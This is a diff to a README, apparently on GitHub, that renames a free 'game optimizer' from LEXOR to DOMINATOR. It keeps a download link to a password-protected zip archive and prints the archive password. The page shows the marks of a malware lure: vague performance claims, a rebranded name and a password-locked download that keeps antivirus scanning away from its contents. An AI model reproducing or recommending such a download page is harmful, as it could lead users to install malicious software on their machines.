@@ -1,12 +1,10 @@
 # Dominator Game Optimizer 2025 – Boost FPS &amp; Clean Your System Free
-# LEXOR Game Optimizer 2025 – Boost FPS &amp; Clean Your System Free
-# 🚀 **LEXOR — The Ultimate Game Optimization Tool**
 
-👉 **[⬇️ Download LEXOR](https://github.com/N4VAR/DOMINATOR-Game-Optimization/releases/download/Dominator/DOMINATOR.zip)**  
+👉 **[⬇️ Download DOMINATOR](https://github.com/N4VAR/DOMINATOR-Game-Optimization/releases/download/Dominator/DOMINATOR.zip)**  
 🔐 **Password: `DOMINATOR`**
 
 Tired of lag, FPS drops, or stuttering in your favorite games?  
-**LEXOR** is your all-in-one solution to unlock smoother, faster, and cleaner gameplay — no technical knowledge required.
+**DOMINATOR** is your all-in-one solution to unlock smoother, faster, and cleaner gameplay — no technical knowledge required.
 
 ---
 
